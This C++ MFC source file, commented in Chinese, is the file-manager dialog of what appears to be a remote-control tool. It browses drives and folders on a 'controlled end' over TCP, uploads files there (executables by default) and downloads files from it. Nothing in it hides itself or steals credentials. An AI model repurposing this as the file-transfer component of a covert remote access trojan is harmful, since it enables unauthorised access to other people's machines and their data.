// CCheckFile.cpp: 实现文件
//

#include "pch.h"
#include "MainContralView.h"
#include "CCheckFile.h"
#include "afxdialogex.h"

// CCheckFile 对话框

IMPLEMENT_DYNAMIC(CCheckFile, CDialogEx)

CTcpSocket* CCheckFile::GetTcpSocket()
{
	return m_pTcpClient;
}

void CCheckFile::SetTcpSocket(CTcpSocket* pTcpSocket)
{
	m_pTcpClient = pTcpSocket;
}

CCheckFile::CCheckFile(CWnd* pParent /*=nullptr*/)
	: CDialogEx(DLG_FILE, pParent)
{

}

CCheckFile::~CCheckFile()
{
}

void CCheckFile::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, LST_FILE, m_lstsFiles);
	DDX_Control(pDX, IDC_PROGRESS1, m_Progress);
}


BEGIN_MESSAGE_MAP(CCheckFile, CDialogEx)
	ON_BN_CLICKED(BTN_RETURN, &CCheckFile::OnBnClickedReturn)
	ON_BN_CLICKED(BTN_UPLOAD, &CCheckFile::OnBnClickedUpload)
	ON_BN_CLICKED(BTN_DOWNLOAD, &CCheckFile::OnBnClickedDownload)
	ON_NOTIFY(NM_DBLCLK, LST_FILE, &CCheckFile::OnNMDblclkFiles)
END_MESSAGE_MAP()


// CCheckFile 消息处理程序


BOOL CCheckFile::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	//初始化
	m_lstsFiles.InsertColumn(0, "文件名", 0, 440);
	m_lstsFiles.InsertColumn(1, "类型", 0, 100); //文件夹或者文件


	m_lstsFiles.SetExtendedStyle(m_lstsFiles.GetExtendedStyle() | LVS_EX_FULLROWSELECT);

	//发送命令, 获取盘符
	GetDrivers();

	//修改标题显示端口号
	CString csFmt;
	csFmt.Format("端口号:%d 正在被控制 ...", ntohs(m_pTcpClient->GetSockaddrIn().sin_port));
	SetWindowText(csFmt);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CCheckFile::GetDrivers()
{
	PKGHDR pkgGetDrivers;
	pkgGetDrivers.m_cmd = DT_GETDIRVERS;
	pkgGetDrivers.m_nLen = 2;
	m_pTcpClient->Send((char*)&pkgGetDrivers, sizeof(pkgGetDrivers));
	m_pTcpClient->Send("1", 2);
}


void CCheckFile::OnBnClickedReturn()
{
	// 清理数据
	m_lstsFiles.DeleteAllItems();
	nItem = 0;
	//发送命令, 获取盘符
	GetDrivers();
	SetDlgItemText(EDT_FILEPATH, "我的电脑 ");
}


void CCheckFile::OnBnClickedUpload()
{
	//获取文件要上传到的路径
	CString strTarPath;
	GetDlgItemText(EDT_FILEPATH, strTarPath);

	//打开源文件路径，获取文件路径
	CFileDialog dlg(TRUE, NULL, NULL, OFN_HIDEREADONLY, _T("exe File(*.exe)|*.exe|All File (*.*)|*.*||"), this);
	CString  strOriPath;
	if (dlg.DoModal() == IDOK)
	{
		//获取文件绝对路径
		strOriPath = dlg.GetPathName();
	}
	else
	{
		return;
	}

	//截取文件名
	CString strTarFileName;
	int index = strOriPath.ReverseFind('\\');
	CString strType = strOriPath.Mid(index + 1);
	CString strTarFile = strTarPath + "\\" + strType;

	//告诉被控端开始创建文件
	PKGHDR pkgPath;
	pkgPath.m_cmd = DT_FILE_TAR_PATH;
	pkgPath.m_nLen = strTarFile.GetLength() + 1;

	m_pTcpClient->Send((char*)&pkgPath, sizeof(pkgPath));
	m_pTcpClient->Send(strTarFile.GetBuffer(), pkgPath.m_nLen);


	//打开源文件
	hFileSrc = ::CreateFile(
		strOriPath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//每次上传64K
	const DWORD dwPerSize = 0x10000;
	char aryBuff[dwPerSize] = { 0 };

	//获取文件的总大小
	__int64 nTotalFileSize = 0;
	GetFileSizeEx(hFileSrc, (PLARGE_INTEGER)&nTotalFileSize);

	//已经处理的数据的大小
	__int64 nHanleFileSize = 0;

	while (true)
	{
		//从源文件读取64K
		DWORD dwBytesToRead = 0;
		BOOL bRet = ::ReadFile(
			hFileSrc,
			aryBuff,
			sizeof(aryBuff),
			&dwBytesToRead, //实际读取的字节数
			NULL);

		// 发送存放读取的字节的缓存区到被控端的新文件
		PKGHDR pkgUpload;
		pkgUpload.m_cmd =DT_FILE_UPLOAD;
		pkgUpload.m_nLen = dwBytesToRead;
		m_pTcpClient->Send((char*)& pkgUpload, sizeof(pkgUpload));
		m_pTcpClient->Send (aryBuff, dwBytesToRead);

		//判断文件是否读取完毕
		nHanleFileSize += dwBytesToRead;

		//显示进度
		m_Progress.SetRange(0, 100);
		double dblHandleSize = nHanleFileSize;
		double dblTotaleSize = nTotalFileSize;
		int nPos = (int)(dblHandleSize * 100 / dblTotaleSize);
		m_Progress.SetPos(nPos);


		if (nHanleFileSize >= nTotalFileSize)
		{
			AfxMessageBox("文件上传完毕");
			m_Progress.SetPos(0);
			CloseHandle(hFileSrc);
			m_lstsFiles.SetItemText(nItem++, 0, strTarFile);
			//告诉被控端文件上传完毕、关闭句柄
			PKGHDR pkgUploadOver;
			pkgUploadOver.m_cmd = DT_FILE_UPLOAD_OVER;
			pkgUploadOver.m_nLen = 0;
			m_pTcpClient->Send((char*)&pkgUploadOver, sizeof(pkgUploadOver));

			break;
		}


	}
}


void CCheckFile::OnBnClickedDownload()
{
	//选则下载路径
	TCHAR      szFolderPath[MAX_PATH] = { 0 };
	CString     strFolderPath = TEXT("");

	BROWSEINFO      sInfo;  //文件夹属性结构体
	::ZeroMemory(&sInfo, sizeof(BROWSEINFO));
	sInfo.pidlRoot = 0;
	sInfo.lpszTitle = _T("请选择处理结果存储路径:");
	sInfo.ulFlags = BIF_RETURNONLYFSDIRS | BIF_EDITBOX | BIF_DONTGOBELOWDOMAIN | BIF_NEWDIALOGSTYLE;
	sInfo.lpfn = NULL;

	// 显示文件夹选择对话框  
	LPITEMIDLIST lpidlBrowse = ::SHBrowseForFolder(&sInfo);
	if (lpidlBrowse != NULL)
	{
		// 取得文件夹名  
		if (::SHGetPathFromIDList(lpidlBrowse, szFolderPath))
		{
			strFolderPath = szFolderPath;
		}
		else
		{
			return;
		}
	}
	else
	{
		return;
	}
	if (lpidlBrowse != NULL)
	{
		::CoTaskMemFree(lpidlBrowse);
	}
	else
	{
		return;
	}

	//获取当前文件路径
	CString strOriPath;

	int nSel= m_lstsFiles.GetSelectionMark();
	strOriPath = m_lstsFiles.GetItemText(nSel, 0);



	//截取文件名
	CString strTarFileName;
	int index = strOriPath.ReverseFind('\\');
	CString strType = strOriPath.Mid(index + 1);
	CString strTarFile = strFolderPath + "\\" + strType;


	//创建目标文件
	hFileDst = ::CreateFile(
		strTarFile,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS, //目标文件总是创建新文件,如果文件已经存在,则清掉原文件内容
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFileDst == INVALID_HANDLE_VALUE)
	{
		AfxMessageBox("创建目标文件句柄失败\r\n");
		//delete[] hFileDst;
	}

	//发送选中文件路径到被控端
	PKGHDR pkgOriPath;
	pkgOriPath.m_cmd = DT_FILE_DOWNLOAD;
	pkgOriPath.m_nLen = strOriPath.GetLength() + 1;

	m_pTcpClient->Send((char*)&pkgOriPath, sizeof(pkgOriPath));
	m_pTcpClient->Send(strOriPath.GetBuffer(), pkgOriPath.m_nLen);

}


void CCheckFile::OnNMDblclkFiles(NMHDR* pNMHDR, LRESULT* pResult)
{

	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
	CString szPath;
	CString isFile;

	nItem = pNMItemActivate->iItem;

	szPath = m_lstsFiles.GetItemText(nItem, 0);
	isFile = m_lstsFiles.GetItemText(nItem, 1);

	if (isFile == "文件")
	{
		return;
	}

	// 清理数据
	m_lstsFiles.DeleteAllItems();
	nItem = 0;


	SetDlgItemText(EDT_FILEPATH, szPath);
	GetFilePath(szPath);


}

void CCheckFile::GetFilePath(CString& filePath)
{
	// TODO: 在此处添加实现代码.
	/*
	DATAPACKAGE pkgDrivers;
	pkgDrivers.m_hdr.m_nDataType = DT_GETFILEPATH;
	pkgDrivers.m_hdr.m_nDataLen = filePath.GetLength() + 1;
	pkgDrivers.m_pBuff = filePath.GetBuffer(0);
	m_pTcpClient->SendPackage(&pkgDrivers);
	*/

	PKGHDR pkgGetFilePath;
	pkgGetFilePath.m_cmd = DT_GETFILEPATH;
	pkgGetFilePath.m_nLen = filePath.GetLength() + 1;
	m_pTcpClient->Send((char*)&pkgGetFilePath,sizeof(pkgGetFilePath));
	m_pTcpClient->Send(filePath.GetBuffer(), filePath.GetLength()+1);

}

void CCheckFile::ShowDivers(LPBYTE pBuff, DWORD dwBuffSize)
{

	CString strDriver;
	strDriver = pBuff;

	//显示到界面
	m_lstsFiles.InsertItem(nItem, strDriver);
	m_lstsFiles.SetItemText(nItem++, 1, "磁盘");
	//m_lstsFiles.SetItemText(nItem++, 2, );
	SetDlgItemText(EDT_FILEPATH, "我的电脑");

	return;
}

void CCheckFile::ShowFilePath(LPBYTE pBuff, DWORD dwBuffSizef)
{
	//拿到结构体
	PFILEINFO pFile=(PFILEINFO)pBuff;
	//csFileSize.Format("%d", pFile->FileSize);

	//显示到界面
	m_lstsFiles.InsertItem(nItem, pFile->FileName);

	if (pFile->FileType == 1)
	{
		m_lstsFiles.SetItemText(nItem, 1, "文件夹");
	}
	else 
	{
		m_lstsFiles.SetItemText(nItem, 1, "文件");
	}
	//m_lstsFiles.SetItemText(nItem++, 2, csFileSize);
	nItem++;
	delete pFile;
}

void CCheckFile::DownLoad(LPBYTE pBuff, DWORD dwBuffSize)
{
	//写入新文件
	DWORD dwBytesToWrite = 0;
	BOOL bRet = ::WriteFile(
		hFileDst,
		pBuff,
		dwBuffSize, //读取了多少字节,就写入多少字节
		&dwBytesToWrite,
		NULL);

	/*
	preFileSize += dwBuffSize;
	//显示进度
	DWORD dblHandleSize = preFileSize;
	DWORD dblTotaleSize = TotalFileSize;
	int nPos = (int)(dblHandleSize / dblTotaleSize * 100);
	m_Progress.OffsetPos(nPos);

	*/

	delete[] pBuff;
}

void CCheckFile::DownLoadOver()
{
	CloseHandle(hFileDst);
	AfxMessageBox("文件下载完毕");
}

void CCheckFile::GetTolFileSize(LPBYTE pBuff, DWORD dwBuffSize)
{
	TotalFileSize =dwBuffSize;
}
